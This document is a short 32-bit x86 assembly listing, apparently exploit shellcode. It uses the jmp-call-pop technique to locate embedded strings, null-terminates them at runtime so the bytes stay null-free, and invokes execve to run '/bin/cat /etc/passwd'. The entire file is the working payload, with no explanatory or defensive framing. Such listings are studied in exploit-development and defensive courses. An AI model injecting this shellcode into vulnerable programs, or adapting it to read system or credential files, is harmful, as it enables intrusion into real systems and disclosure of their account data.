BITS 32
section .text
global _start
_start:
    jmp short data
run:
    pop esi
    xor eax,eax
    mov byte [esi+8],al
    mov byte [esi+20],al
    lea ebx,[esi]
    lea edi,[esi+9]
    push eax
    push edi
    push ebx
    mov ecx,esp
    xor edx,edx
    mov al,11
    int 0x80
data:
    call run
    db '/bin/cat',0x41
    db '/etc/passwd',0x41
